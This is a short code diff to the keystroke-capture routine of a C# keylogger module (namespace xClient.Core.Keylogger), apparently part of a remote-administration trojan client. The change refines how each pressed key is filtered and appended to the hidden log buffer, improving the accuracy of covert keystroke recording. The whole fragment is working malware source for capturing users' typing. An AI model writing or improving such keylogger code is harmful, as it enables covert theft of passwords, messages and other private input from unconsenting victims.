@@ -133,12 +133,16 @@ namespace xClient.Core.Keylogger
             if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                 return;
 
-            if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
+            if ((!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
             {
-                Debug.WriteLine("OnKeyPress Output: " + e.KeyChar);
-                _ignoreSpecialKeys = true;
-                _pressedKeyChars.Add(e.KeyChar);
-                _logFileBuffer.Append(LoggerHelper.Filter(e.KeyChar));
+                var filtered = LoggerHelper.Filter(e.KeyChar);
+                if (!string.IsNullOrEmpty(filtered))
+                {
+                    Debug.WriteLine("OnKeyPress Output: " + filtered);
+                    _ignoreSpecialKeys = true;
+                    _pressedKeyChars.Add(e.KeyChar);
+                    _logFileBuffer.Append(filtered);
+                }
             }
         }
 
